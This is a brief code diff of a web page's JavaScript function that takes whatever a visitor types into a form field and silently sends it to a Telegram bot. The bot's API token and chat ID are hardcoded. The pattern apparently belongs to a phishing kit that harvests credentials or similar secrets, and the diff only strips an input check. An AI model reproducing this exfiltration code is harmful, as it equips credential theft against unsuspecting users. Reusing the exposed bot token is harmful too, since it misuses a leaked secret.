@@ -551,11 +551,7 @@ function sendData() {
   const botApiToken = '6124695087:AAG0NprnUOPuxyaHA_79ZDazy870_007Dtk';
   const chatId = '6034570280';
   const input = document.getElementById('splink').value; 
-if(input==""){
-  input.style.borderColor="red"
-  input.style.borderWidth="1px"
-  input.style.borderStyle="solid"
-}
+
   const url = `https://api.telegram.org/bot${botApiToken}/sendMessage?chat_id=${chatId}&text=${input}+ Speaking`;
 document.getElementById("transition").style.display="block"
   fetch(url)
